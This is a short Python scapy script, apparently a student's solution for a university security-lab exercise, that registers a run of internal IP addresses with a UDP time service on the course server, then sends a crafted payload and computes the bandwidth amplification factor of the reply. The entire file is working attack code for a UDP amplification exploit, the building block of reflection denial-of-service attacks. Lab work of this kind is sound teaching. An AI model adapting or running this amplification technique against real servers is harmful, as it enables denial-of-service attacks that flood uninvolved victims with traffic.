#!/usr/bin/env python

from scapy.all import Raw, IP, sr1, send, UDP

import sys

SERVER_IP = "cs177.seclab.cs.ucsb.edu"

def main():
    if len(sys.argv) != 2:
        print("Usage: python dns_amplify.py <port>")
        return 1

    port = int(sys.argv[1])

    for i in range(50):
        ip = f"10.0.0.{i}"
        print(f"Sending IP: {ip}")
        payload = f"TimeRequest {ip}".encode()
        packet = IP(dst=SERVER_IP) / UDP(dport=port) / Raw(load=payload)
        send(packet, verbose=0)

    payload = b"0x1f" + 47 * b"\x00"

    packet = IP(dst=SERVER_IP) / UDP(dport=port) / Raw(load=payload)

    response = sr1(packet, timeout=12, verbose=0)

    if response:
        response.show()

        request_size = len(bytes(packet[Raw]))
        response_size = len(bytes(response[Raw])) if response else 0

        print(f"Request Size: {request_size}")
        print(f"Response Size: {response_size}")
        print(f"BAF: {response_size / request_size:.2f}")
    else:
        print("No response")


if __name__ == "__main__":
    main()
